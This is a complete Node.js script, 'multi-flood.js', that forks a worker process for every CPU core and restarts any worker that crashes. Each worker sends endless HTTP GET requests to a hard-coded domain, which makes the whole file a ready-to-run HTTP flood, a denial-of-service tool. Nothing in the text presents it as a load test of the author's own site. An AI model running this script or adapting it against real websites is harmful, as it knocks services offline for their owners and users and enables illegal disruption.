// multi-flood.js
const cluster = require("cluster");
const os = require("os");
const axios = require("axios");

const url = "https://prabhatrathva.xyz";
const numCPUs = os.cpus().length; // You can set this to os.cpus().length or any number
console.log(`Number of CPUs: ${numCPUs}`);

if (cluster.isMaster) {
  console.log(`Master ${process.pid} is running`);

  // Fork workers
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  // Optional: restart workers if they crash
  cluster.on("exit", (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died. Restarting...`);
    cluster.fork();
  });
} else {
  console.log(`Worker ${process.pid} started`);

  let count = 0;

  async function sendRequests() {
    while (true) {
      try {
        const res = await axios.get(url);
        count++;
        console.log(
          `[Worker ${process.pid}] Request #${count} - ${res.status}`
        );
      } catch (err) {
        console.error(`[Worker ${process.pid}] Failed: ${err.message}`);
      }
    }
  }

  sendRequests();
}
